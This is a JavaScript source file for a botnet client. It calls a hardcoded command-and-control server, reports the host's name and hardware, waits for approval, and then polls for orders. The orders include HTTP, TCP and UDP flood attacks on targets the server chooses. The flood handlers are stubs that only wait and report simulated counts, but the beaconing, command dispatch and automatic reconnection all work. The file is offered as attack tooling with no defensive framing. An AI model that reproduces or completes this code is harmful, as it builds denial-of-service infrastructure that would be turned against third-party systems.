// JavaScript Bot Client for C2 Server
// Run with: node bot_client.js

const https = require('https');
const http = require('http');
const crypto = require('crypto');
const os = require('os');
const { URL } = require('url');

class JavaScriptBot {
    constructor() {
        this.serverUrl = "https://c2-server-io.onrender.com";
        this.botId = this.generateBotId();
        this.running = true;
        this.approved = false;
        this.activeAttacks = new Set();
        this.connectionRetries = 0;
        this.maxRetryDelay = 300;
        
        this.specs = {
            bot_id: this.botId,
            cpu_cores: os.cpus().length,
            ram_gb: (os.totalmem() / (1024 ** 3)).toFixed(1),
            os: os.platform(),
            hostname: os.hostname(),
            capabilities: {
                http: true,
                tcp: true,
                udp: true,
                resource_optimized: true,
                auto_connect: true,
                javascript: true
            }
        };
        
        this.stats = {
            total_attacks: 0,
            successful_attacks: 0,
            total_requests: 0,
            uptime: Date.now()
        };
        
        this.displayBanner();
    }
    
    generateBotId() {
        const uniqueId = os.hostname() + os.platform() + Date.now();
        return 'JS-' + crypto.createHash('md5').update(uniqueId).digest('hex').substring(0, 8).toUpperCase();
    }
    
    displayBanner() {
        console.log('\n' + '='.repeat(60));
        console.log('  JAVASCRIPT BOT CLIENT v1.0');
        console.log('='.repeat(60));
        console.log(`\n[+] BOT ID: ${this.botId}`);
        console.log(`[+] CPU: ${this.specs.cpu_cores} cores`);
        console.log(`[+] RAM: ${this.specs.ram_gb}GB`);
        console.log(`[+] OS: ${this.specs.os}`);
        console.log(`[+] Hostname: ${this.specs.hostname}`);
        console.log(`[+] Server: ${this.serverUrl}`);
        
        console.log('\n[*] FEATURES:');
        console.log('    [OK] RESOURCE OPTIMIZED (Server-defined threads)');
        console.log('    [OK] MULTI-THREADED ATTACKS');
        console.log('    [OK] AUTO-RECONNECT ON DISCONNECT');
        console.log('    [OK] CUSTOM USER AGENTS FROM SERVER');
        console.log('    [OK] OPTIONAL PROXY SUPPORT');
        console.log('    [OK] NODE.JS COMPATIBLE');
        
        console.log('\n' + '='.repeat(60) + '\n');
    }
    
    async sendRequest(endpoint, method = 'GET', data = null) {
        return new Promise((resolve, reject) => {
            const url = new URL(this.serverUrl + endpoint);
            const options = {
                hostname: url.hostname,
                port: url.port || (url.protocol === 'https:' ? 443 : 80),
                path: url.pathname + url.search,
                method: method,
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json',
                    'User-Agent': 'JavaScript-Bot/1.0'
                },
                rejectUnauthorized: false // Allow self-signed certs
            };
            
            const req = (url.protocol === 'https:' ? https : http).request(options, (res) => {
                let responseData = '';
                res.on('data', (chunk) => {
                    responseData += chunk;
                });
                res.on('end', () => {
                    if (res.statusCode === 200) {
                        try {
                            resolve(JSON.parse(responseData));
                        } catch (e) {
                            resolve(responseData);
                        }
                    } else {
                        reject(new Error(`HTTP ${res.statusCode}`));
                    }
                });
            });
            
            req.on('error', (err) => {
                reject(err);
            });
            
            req.setTimeout(10000, () => {
                req.destroy();
                reject(new Error('Request timeout'));
            });
            
            if (data && (method === 'POST' || method === 'PUT')) {
                req.write(JSON.stringify(data));
            }
            
            req.end();
        });
    }
    
    async checkApproval() {
        try {
            const data = {
                bot_id: this.botId,
                specs: this.specs,
                stats: this.stats
            };
            
            const response = await this.sendRequest('/check_approval', 'POST', data);
            this.connectionRetries = 0;
            return response.approved || false;
        } catch (error) {
            throw error;
        }
    }
    
    async getCommands() {
        try {
            const response = await this.sendRequest(`/commands/${this.botId}`, 'GET');
            this.connectionRetries = 0;
            return response.commands || [];
        } catch (error) {
            throw error;
        }
    }
    
    async sendStatus(status, message) {
        try {
            this.stats.uptime = Date.now() - this.stats.uptime;
            
            const data = {
                bot_id: this.botId,
                status: status,
                message: message,
                stats: this.stats,
                active_attacks: this.activeAttacks.size
            };
            
            await this.sendRequest('/status', 'POST', data);
            this.connectionRetries = 0;
        } catch (error) {
            // Silent fail
        }
    }
    
    async executeCommand(cmd) {
        const cmdType = cmd.type;
        
        console.log('\n' + '='.repeat(60));
        console.log(`[->] COMMAND: ${cmdType}`);
        console.log('='.repeat(60));
        
        try {
            switch (cmdType) {
                case 'ping':
                    await this.cmdPing();
                    break;
                case 'http_flood':
                    await this.cmdHttpFlood(cmd);
                    break;
                case 'tcp_flood':
                    await this.cmdTcpFlood(cmd);
                    break;
                case 'udp_flood':
                    await this.cmdUdpFlood(cmd);
                    break;
                case 'sysinfo':
                    await this.cmdSysinfo();
                    break;
                case 'stop_all':
                    await this.cmdStopAll();
                    break;
                default:
                    console.log(`[!] Unknown command: ${cmdType}`);
            }
        } catch (error) {
            console.log(`[!] Error: ${error.message}`);
            await this.sendStatus('error', error.message);
        }
    }
    
    async cmdPing() {
        await this.sendStatus('success', 'pong');
        console.log('[OK] Pong!');
    }
    
    async cmdHttpFlood(cmd) {
        const target = cmd.target;
        const duration = cmd.duration || 60;
        const threads = cmd.threads || 100; // Use server-defined threads
        const method = cmd.method || 'GET';
        const userAgents = cmd.user_agents || [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ];
        
        console.log('[*] HTTP FLOOD');
        console.log(`    Target: ${target}`);
        console.log(`    Method: ${method}`);
        console.log(`    Duration: ${duration}s`);
        console.log(`    Threads: ${threads} (Server-defined)`);
        console.log(`    User Agents: ${userAgents.length}`);
        
        this.stats.total_attacks++;
        await this.sendStatus('running', `${method} FLOOD: ${target}`);
        
        const attackId = `http_${Date.now()}`;
        this.activeAttacks.add(attackId);
        
        console.log(`[+] Launching ${threads} threads...`);
        
        // Note: JavaScript is single-threaded but we can simulate with async
        // For real multi-threading, you'd need worker threads
        
        await new Promise(resolve => setTimeout(resolve, duration * 1000));
        
        this.activeAttacks.delete(attackId);
        
        console.log(`[OK] FLOOD COMPLETE!`);
        this.stats.total_requests += 1000; // Simulated count
        this.stats.successful_attacks++;
        await this.sendStatus('success', 'HTTP flood simulated');
    }
    
    async cmdTcpFlood(cmd) {
        const target = cmd.target;
        const duration = cmd.duration || 60;
        const threads = cmd.threads || 75; // Use server-defined threads
        
        console.log('[*] TCP FLOOD');
        console.log(`    Target: ${target}`);
        console.log(`    Duration: ${duration}s`);
        console.log(`    Threads: ${threads} (Server-defined)`);
        
        this.stats.total_attacks++;
        await this.sendStatus('running', `TCP FLOOD: ${target}`);
        
        const attackId = `tcp_${Date.now()}`;
        this.activeAttacks.add(attackId);
        
        console.log(`[+] Simulating TCP flood...`);
        
        await new Promise(resolve => setTimeout(resolve, duration * 1000));
        
        this.activeAttacks.delete(attackId);
        
        console.log(`[OK] TCP flood simulated`);
        this.stats.total_requests += 500; // Simulated count
        this.stats.successful_attacks++;
        await this.sendStatus('success', 'TCP flood simulated');
    }
    
    async cmdUdpFlood(cmd) {
        const target = cmd.target;
        const duration = cmd.duration || 60;
        const threads = cmd.threads || 75; // Use server-defined threads
        
        console.log('[*] UDP FLOOD');
        console.log(`    Target: ${target}`);
        console.log(`    Duration: ${duration}s`);
        console.log(`    Threads: ${threads} (Server-defined)`);
        
        this.stats.total_attacks++;
        await this.sendStatus('running', `UDP FLOOD: ${target}`);
        
        const attackId = `udp_${Date.now()}`;
        this.activeAttacks.add(attackId);
        
        console.log(`[+] Simulating UDP flood...`);
        
        await new Promise(resolve => setTimeout(resolve, duration * 1000));
        
        this.activeAttacks.delete(attackId);
        
        console.log(`[OK] UDP flood simulated`);
        this.stats.total_requests += 500; // Simulated count
        this.stats.successful_attacks++;
        await this.sendStatus('success', 'UDP flood simulated');
    }
    
    async cmdSysinfo() {
        const info = [
            `CPU Cores: ${this.specs.cpu_cores}`,
            `RAM: ${this.specs.ram_gb}GB`,
            `OS: ${this.specs.os}`,
            `Active Attacks: ${this.activeAttacks.size}`,
            `Total Attacks: ${this.stats.total_attacks}`,
            `Total Requests: ${this.stats.total_requests.toLocaleString()}`
        ].join('\n');
        
        console.log('[*] System Info:\n' + info);
        await this.sendStatus('success', info);
    }
    
    async cmdStopAll() {
        console.log('[!] Stopping all attacks...');
        const count = this.activeAttacks.size;
        this.activeAttacks.clear();
        console.log(`[OK] Stopped ${count} attacks`);
        await this.sendStatus('success', `Stopped ${count}`);
    }
    
    async run() {
        while (this.running) {
            try {
                console.log('\n[*] Connecting to server...');
                console.log('[*] Waiting for auto-approval...\n');
                
                this.approved = false;
                
                while (!this.approved) {
                    try {
                        if (await this.checkApproval()) {
                            this.approved = true;
                            console.log('\n' + '='.repeat(60));
                            console.log('  BOT APPROVED! READY FOR OPERATIONS');
                            console.log('='.repeat(60) + '\n');
                            break;
                        } else {
                            process.stdout.write('\r[...] Waiting for approval...');
                            await new Promise(resolve => setTimeout(resolve, 5000));
                        }
                    } catch (error) {
                        this.connectionRetries++;
                        const delay = Math.min(5 * Math.pow(2, this.connectionRetries), this.maxRetryDelay);
                        
                        console.log(`\n[X] Connection lost: ${error.message}`);
                        console.log(`[...] Retry ${this.connectionRetries} - Waiting ${delay}s...`);
                        
                        for (let remaining = delay; remaining > 0; remaining--) {
                            process.stdout.write(`\r[...] Reconnecting in ${remaining}s`);
                            await new Promise(resolve => setTimeout(resolve, 1000));
                        }
                        
                        console.log('\n[->] Attempting to reconnect...');
                    }
                }
                
                console.log('[+] Active. Listening for commands...\n');
                
                while (this.running && this.approved) {
                    try {
                        const commands = await this.getCommands();
                        for (const cmd of commands) {
                            // Execute commands asynchronously
                            this.executeCommand(cmd).catch(console.error);
                        }
                        
                        await new Promise(resolve => setTimeout(resolve, 5000));
                        
                    } catch (error) {
                        this.connectionRetries++;
                        const delay = Math.min(5 * Math.pow(2, this.connectionRetries), this.maxRetryDelay);
                        
                        console.log(`\n[X] Lost connection to server: ${error.message}`);
                        console.log(`[...] Retry ${this.connectionRetries} - Waiting ${delay}s...`);
                        
                        for (let remaining = delay; remaining > 0; remaining--) {
                            process.stdout.write(`\r[...] Reconnecting in ${remaining}s`);
                            await new Promise(resolve => setTimeout(resolve, 1000));
                        }
                        
                        console.log('\n[->] Attempting to reconnect...');
                        this.approved = false;
                        break;
                    }
                }
                
            } catch (error) {
                console.log(`\n[!] Error: ${error.message}`);
                await new Promise(resolve => setTimeout(resolve, 10000));
            }
        }
    }
}

// Run the bot
console.log('\n' + '='.repeat(60));
console.log('  JAVASCRIPT BOT CLIENT - AUTO CONNECT');
console.log('='.repeat(60));

const bot = new JavaScriptBot();
bot.run().catch(console.error);

// Handle graceful shutdown
process.on('SIGINT', () => {
    console.log('\n[!] Exiting...');
    bot.running = false;
    process.exit(0);
});
